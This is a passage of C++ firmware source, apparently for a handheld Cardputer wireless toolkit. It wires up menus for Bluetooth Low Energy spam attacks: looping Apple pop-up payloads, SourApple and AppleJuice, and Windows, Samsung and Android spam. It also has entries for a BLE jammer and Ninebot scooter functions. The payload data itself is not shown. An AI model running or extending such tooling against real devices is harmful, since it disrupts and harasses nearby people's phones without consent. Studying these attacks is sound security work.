    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit(true);
}

void bleSpamMenu()
{
    std::vector<Option> opts;
    
    std::vector<Option> appleOpts;
    appleOpts.push_back({"Spam All Apple", []() {
        
        drawMainBorder(true);
        M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
        M5.Display.setTextSize(FP);
        M5.Display.setTextDatum(top_left);
        M5.Display.drawString("APPLE SPAM ALL", 4, 28);
        logClear();
        logPrint("Cycling 22 Apple payloads");
        logPrint("Back: stop");
        logRender();
        int idx = 0;
        for (;;) {
            String line = String(apple_payloads[idx].name) + " " + String(millis() / 1000) + "s";
            logPrint(line);
            logRender();
            quickAppleSpam(idx);
            idx = (idx + 1) % apple_payload_count;
            M5.update();
            pollKeyboard();
            if (check(EscPress)) { waitAllKeysReleased(); break; }
        }
        NimBLEDevice::deinit(true);
    }});
    for (int i = 0; i < apple_payload_count; i++) {
        appleOpts.push_back({apple_payloads[i].name, [i]() {
            drawMainBorder(true);
            M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
            M5.Display.setTextSize(FP);
            M5.Display.setTextDatum(top_left);
            M5.Display.drawString("APPLE SPAM", 4, 28);
            logClear();
            logPrint("Payload: " + String(apple_payloads[i].name));
            logPrint("Back: stop");
            logRender();
            for (;;) {
                quickAppleSpam(i);
                M5.update();
                pollKeyboard();
                if (check(EscPress)) { waitAllKeysReleased(); break; }
            }
            NimBLEDevice::deinit(true);
        }});
    }
    appleOpts.push_back({"Back", [](){}});
    opts.push_back({"Apple Spam", [appleOpts]() {
        loopOptions(const_cast<std::vector<Option>&>(appleOpts), MENU_TYPE_REGULAR, "Apple Spam");
    }});
    opts.push_back({"Apple Spam (Legacy)", []() {
        std::vector<Option> legacyOpts = {
            {"SourApple", []() { aj_adv(7); }},
            {"AppleJuice", []() { aj_adv(8); }},
            {"Back", [](){}},
        };
        loopOptions(legacyOpts, MENU_TYPE_REGULAR, "Apple Spam (Legacy)");
    }});
    opts.push_back({"Windows Spam",  []() { aj_adv(2); }});
    opts.push_back({"Samsung Spam",  []() { aj_adv(3); }});
    opts.push_back({"Android Spam",  []() { aj_adv(4); }});
    opts.push_back({"Spam All",      []() { aj_adv(5); }});
    opts.push_back({"Spam Custom",   []() { aj_adv(6); }});
    opts.push_back({"Back",          [](){}});
    loopOptions(opts, MENU_TYPE_REGULAR, "BLE Spam");
}

void bleMenuEntry()
{
    for (;;) {
        std::vector<Option> opts;
        opts.push_back({"BLE Scan",  []() { bleScan();           }});
        opts.push_back({"iBeacon",   []() { bleIbeacon("KITEN", "e4c159a0-8c82-11e6-bdf4-0800200c9a66", 0x004C); }});
        opts.push_back({"BLE Spam",  []() { bleSpamMenu();       }});
        opts.push_back({"BLE Suite", []() {
            displayInfo(
                "BLE Suite\n"
                "KITEN's BLE_Suite.cpp is 5,493 lines\n"
                "with 8 helper files. Too heavy for\n"
                "the Cardputer's flash alongside\n"
                "everything else. Use BLE Scan /\n"
                "iBeacon / BLE Spam / Ninebot\n"
                "for full BLE functionality.",
                true);
        }});
        opts.push_back({"Ninebot",   []() { ninebotMenu();       }});
        opts.push_back({"BLE Jam",   []() { bleJammerMenuEntry(); }});
        opts.push_back({"Main Menu", [](){}});
        int s = loopOptions(opts, MENU_TYPE_SUBMENU, "Bluetooth");
        if (s == -1 || s == (int)opts.size() - 1) return;
    }
}
